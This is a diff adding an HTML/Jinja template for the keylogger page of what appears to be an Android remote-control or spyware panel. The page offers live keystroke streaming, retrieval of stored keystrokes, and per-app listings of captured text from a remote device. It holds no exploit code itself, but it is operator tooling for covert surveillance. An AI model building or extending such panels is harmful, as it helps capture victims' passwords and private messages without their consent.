@@ -1,0 +1,380 @@
+{% extends 'base/commands.html' %} {% block extra_css %}
+<link rel="stylesheet" href="../../../../../static/assets/css/keylogger.css" />
+
+{% endblock %} {% block content %}
+
+<div
+  class="content-section active"
+  id="keylogger-section"
+  data-device-id="{{ device.device_id }}"
+>
+  <div class="d-flex align-items-center mb-4">
+    <!-- CSRF Token -->
+    <meta name="csrf-token" content="{{ csrf_token() }}" />
+    <div class="flex-fill">
+      <ul class="breadcrumb mb-2">
+        <li class="breadcrumb-item">
+          <a href="#" class="text-decoration-none">COMMANDS</a>
+        </li>
+        <li class="breadcrumb-item active">KEYLOGGER</li>
+      </ul>
+      <h1 class="page-header mb-2">Keylogger</h1>
+      <p class="text-muted mb-0">Monitor and record keystrokes on the device</p>
+    </div>
+    <div class="ms-4">
+      <button
+        type="button"
+        class="btn btn-outline-theme btn-lg"
+        id="refreshButton"
+      >
+        <i class="fa fa-refresh me-1"></i> Refresh
+      </button>
+    </div>
+  </div>
+
+  <div class="row">
+    <!-- Keylogger Controls Card -->
+    <div class="col-xl-4 mb-4">
+      <div class="card h-100">
+        <div class="card-body">
+          <h5 class="card-title mb-3">Keylogger Controls</h5>
+
+          <!-- Live Mode Toggle -->
+          <div class="mb-4">
+            <div class="d-flex align-items-center mb-2">
+              <h6 class="mb-0 me-2">Live Keylogger</h6>
+              <div id="liveStatusBadge" class="badge bg-gray">Disabled</div>
+            </div>
+            <p class="text-muted fs-13px mb-3">
+              When enabled, keystrokes will be streamed in real-time.
+            </p>
+            <div class="form-check form-switch">
+              <input
+                class="form-check-input"
+                type="checkbox"
+                id="liveToggle"
+                {%
+                if
+                live_status.enabled
+                %}checked{%
+                endif
+                %}
+              />
+              <label class="form-check-label" for="liveToggle">
+                <span id="liveToggleLabel">Enable Live Mode</span>
+              </label>
+            </div>
+          </div>
+
+          <!-- Stored Keylogger -->
+          <div class="mb-4">
+            <h6 class="mb-2">Stored Keylogger</h6>
+            <p class="text-muted fs-13px mb-3">
+              Fetch keystrokes stored on the device.
+            </p>
+            <button class="btn btn-outline-theme w-100" id="fetchStoredButton">
+              <i class="fa fa-download me-1"></i> Fetch Stored Keystrokes
+            </button>
+          </div>
+
+          <!-- Statistics -->
+          <div class="mb-0">
+            <h6 class="mb-3">Statistics</h6>
+            <div class="row">
+              <div class="col-6 mb-3">
+                <div class="stat-item">
+                  <div class="stat-value" id="totalKeystrokesCount">
+                    {{ keystrokes|length }}
+                  </div>
+                  <div class="stat-label">Total Keystrokes</div>
+                </div>
+              </div>
+              <div class="col-6 mb-3">
+                <div class="stat-item">
+                  <div class="stat-value" id="appsCount">{{ apps|length }}</div>
+                  <div class="stat-label">Applications</div>
+                </div>
+              </div>
+              <div class="col-6">
+                <div class="stat-item">
+                  <div class="stat-value" id="todayCount">0</div>
+                  <div class="stat-label">Today</div>
+                </div>
+              </div>
+              <div class="col-6">
+                <div class="stat-item">
+                  <div class="stat-value" id="averagePerApp">0</div>
+                  <div class="stat-label">Avg. Per App</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-arrow">
+          <div class="card-arrow-top-left"></div>
+          <div class="card-arrow-top-right"></div>
+          <div class="card-arrow-bottom-left"></div>
+          <div class="card-arrow-bottom-right"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Live Keylogger Feed Card -->
+    <div class="col-xl-8 mb-4">
+      <div class="card h-100">
+        <div class="card-body">
+          <div class="d-flex justify-content-between align-items-center mb-3">
+            <h5 class="card-title mb-0">Live Keylogger Feed</h5>
+            <div class="live-indicator">
+              <span class="live-dot" id="liveIndicator"></span>
+              <span class="live-label" id="liveLabel">OFFLINE</span>
+            </div>
+          </div>
+          <div class="live-feed-container" id="liveFeedContainer">
+            <div
+              id="emptyLiveState"
+              class="text-center py-5"
+              {%
+              if
+              live_status.enabled
+              %}style="display:none;"
+              {%
+              endif
+              %}
+            >
+              <div class="empty-icon mb-3">
+                <i class="fa fa-keyboard-o fa-4x"></i>
+              </div>
+              <h5 class="empty-title mb-2">No Live Keystrokes</h5>
+              <p class="empty-description mb-4">
+                Enable the live keylogger to see keystrokes in real-time
+              </p>
+              <button class="btn btn-outline-theme" id="enableLiveBtn">
+                <i class="fa fa-play me-1"></i> Enable Live Mode
+              </button>
+            </div>
+
+            <div
+              id="liveFeed"
+              {%
+              if
+              not
+              live_status.enabled
+              %}class="d-none"
+              {%
+              endif
+              %}
+            >
+              <!-- Live keystrokes will be added here -->
+              <div class="keystroke-item-placeholder">
+                <div class="placeholder-text">Waiting for keystrokes...</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-arrow">
+          <div class="card-arrow-top-left"></div>
+          <div class="card-arrow-top-right"></div>
+          <div class="card-arrow-bottom-left"></div>
+          <div class="card-arrow-bottom-right"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Keystroke History Card -->
+  <div class="card mb-4">
+    <div class="card-body">
+      <div class="d-flex justify-content-between align-items-center mb-3">
+        <h5 class="card-title mb-0">Keystroke History</h5>
+        <div class="d-flex">
+          <div class="input-group me-2" style="width: 250px">
+            <input
+              type="text"
+              class="form-control"
+              id="searchInput"
+              placeholder="Search keystrokes..."
+            />
+            <button class="btn btn-outline-theme" type="button">
+              <i class="fa fa-search"></i>
+            </button>
+          </div>
+          <select class="form-select me-2" id="appFilter" style="width: 200px">
+            <option value="">All Applications</option>
+            {% for app_name in apps.keys() %}
+            <option value="{{ app_name }}">{{ app_name }}</option>
+            {% endfor %}
+          </select>
+          <select class="form-select" id="eventTypeFilter" style="width: 150px">
+            <option value="">All Events</option>
+            <option value="TEXT_CHANGE">Text Change</option>
+            <option value="CLICK">Click</option>
+            <option value="DOUBLE_CLICK">Double Click</option>
+            <option value="LONG_CLICK">Long Click</option>
+            <option value="SELECTED">Selected</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="table-responsive">
+        <table class="table table-hover mb-0">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Application</th>
+              <th>Event Type</th>
+              <th>Text/Content</th>
+            </tr>
+          </thead>
+          <tbody id="keystrokesTableBody">
+            {% if keystrokes|length > 0 %} {% for keystroke in keystrokes %}
+            <tr
+              data-app="{{ keystroke.package_name }}"
+              data-event-type="{{ keystroke.event_type }}"
+            >
+              <td>{{ format_keylogger_time(keystroke.timestamp) }}</td>
+              <td>
+                <span class="badge bg-dark">{{ keystroke.package_name }}</span>
+              </td>
+              <td>
+                {% if keystroke.event_type == 'TEXT_CHANGE' %}
+                <span class="badge bg-primary">TEXT</span>
+                {% elif keystroke.event_type == 'CLICK' %}
+                <span class="badge bg-success">CLICK</span>
+                {% elif keystroke.event_type == 'DOUBLE_CLICK' %}
+                <span class="badge bg-info">DOUBLE</span>
+                {% elif keystroke.event_type == 'LONG_CLICK' %}
+                <span class="badge bg-warning">LONG</span>
+                {% elif keystroke.event_type == 'SELECTED' %}
+                <span class="badge bg-gray">SELECT</span>
+                {% else %}
+                <span class="badge bg-secondary"
+                  >{{ keystroke.event_type }}</span
+                >
+                {% endif %}
+              </td>
+              <td>{{ keystroke.text }}</td>
+            </tr>
+            {% endfor %} {% else %}
+            <tr>
+              <td colspan="4" class="text-center py-4">
+                <div class="empty-state">
+                  <div class="empty-icon mb-3">
+                    <i class="fa fa-keyboard-o fa-3x"></i>
+                  </div>
+                  <h6 class="mb-2">No keystroke data available</h6>
+                  <p class="text-muted mb-3">
+                    Fetch stored keystrokes or enable live mode to see keystroke
+                    data
+                  </p>
+                  <button
+                    class="btn btn-sm btn-outline-theme"
+                    id="noDataFetchBtn"
+                  >
+                    <i class="fa fa-download me-1"></i> Fetch Stored Keystrokes
+                  </button>
+                </div>
+              </td>
+            </tr>
+            {% endif %}
+          </tbody>
+        </table>
+      </div>
+
+      <div class="d-flex justify-content-between align-items-center mt-3">
+        <div class="text-muted fs-13px">
+          Showing
+          <span id="displayCount">{{ keystrokes|length }}</span> keystrokes
+        </div>
+        <div>
+          <button class="btn btn-outline-theme btn-sm" id="loadMoreBtn">
+            Load More
+          </button>
+        </div>
+      </div>
+    </div>
+    <div class="card-arrow">
+      <div class="card-arrow-top-left"></div>
+      <div class="card-arrow-top-right"></div>
+      <div class="card-arrow-bottom-left"></div>
+      <div class="card-arrow-bottom-right"></div>
+    </div>
+  </div>
+
+  <!-- Applications Card -->
+  <div class="card">
+    <div class="card-body">
+      <h5 class="card-title mb-3">Applications</h5>
+
+      <div class="row" id="appCards">
+        {% for app_name, app_keystrokes in apps.items() %}
+        <div class="col-md-6 col-xl-3 mb-3">
+          <div class="app-card">
+            <div class="app-icon">
+              <i class="fa fa-android"></i>
+            </div>
+            <div class="app-info">
+              <h6 class="app-name">{{ app_name }}</h6>
+              <div class="app-stats">
+                <div class="app-keystroke-count">
+                  <span class="count">{{ app_keystrokes|length }}</span>
+                  <span class="label">keystrokes</span>
+                </div>
+              </div>
+              <button
+                class="btn btn-sm btn-outline-theme mt-2 filter-by-app"
+                data-app="{{ app_name }}"
+              >
+                View Keystrokes
+              </button>
+            </div>
+          </div>
+        </div>
+        {% endfor %} {% if apps|length == 0 %}
+        <div class="col-12">
+          <div class="text-center py-4">
+            <div class="empty-icon mb-3">
+              <i class="fa fa-apps fa-3x"></i>
+            </div>
+            <h6 class="mb-2">No application data available</h6>
+            <p class="text-muted">
+              Fetch stored keystrokes to see application data
+            </p>
+          </div>
+        </div>
+        {% endif %}
+      </div>
+    </div>
+    <div class="card-arrow">
+      <div class="card-arrow-top-left"></div>
+      <div class="card-arrow-top-right"></div>
+      <div class="card-arrow-bottom-left"></div>
+      <div class="card-arrow-bottom-right"></div>
+    </div>
+  </div>
+</div>
+
+{% endblock content %} {% block extra_js %}
+<script
+  src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"
+  integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA=="
+  crossorigin="anonymous"
+></script>
+
+<!-- Initialize keylogger with data from server -->
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    // Get server data from template
+    var keystrokeData = {{ keystrokes_json|safe }};
+    var deviceId = "{{ device.device_id }}";
+    var isLiveMode = {{ 'true' if live_status.enabled else 'false' }};
+
+    // Initialize keylogger
+    initKeylogger({
+      keystrokeData: keystrokeData,
+      deviceId: deviceId,
+      isLiveMode: isLiveMode
+    });
+  });
+</script>
+{% endblock extra_js %}
